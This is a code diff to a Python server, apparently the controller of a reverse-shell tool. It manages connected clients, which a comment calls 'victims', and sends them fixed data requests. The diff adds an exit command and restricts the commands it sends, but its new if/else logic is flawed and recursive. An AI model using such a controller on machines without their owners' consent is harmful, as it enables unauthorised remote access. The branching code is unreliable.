@@ -85,6 +85,8 @@ def start_turtle():
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
+        elif 'exit' in cmd:
+            exit() #exit command for turtle to be added
         else:
             print("Command not recognized")
             
@@ -98,6 +100,7 @@ def list_connections():
         try:
             conn.send(str.encode(' '))
             conn.recv(20480)
+
         except:
             del all_connections[i]
             del all_address[i]
@@ -116,6 +119,7 @@ def get_target(cmd):
         conn = all_connections[target]
         print("You are now connected to :" + str(all_address[target][0]))
         print(str(all_address[target][0]) + ">", end="")
+        
         return conn
         # 192.168.0.4> dir
 
@@ -125,16 +129,28 @@ def get_target(cmd):
 
 
 # Send commands to client/victim or a friend
-def send_target_commands(conn):
+def send_target_commands(conn):   #change to request data. send data with a string request for data.
     while True:
         try:
             cmd = input()
             if cmd == 'quit':
                 break
-            if len(str.encode(cmd)) > 0:
+            if cmd == 'dataone' :
                 conn.send(str.encode(cmd))
+                time.sleep(2)  
                 client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="")
+                print(client_response)
+                start_turtle()
+            if cmd == 'datatwo' :
+                conn.send(str.encode(cmd))
+                time.sleep(2)  
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response)
+                start_turtle()
+            else:
+                print("Command not valid")
+                break
+              
         except:
             print("Error sending commands")
             break
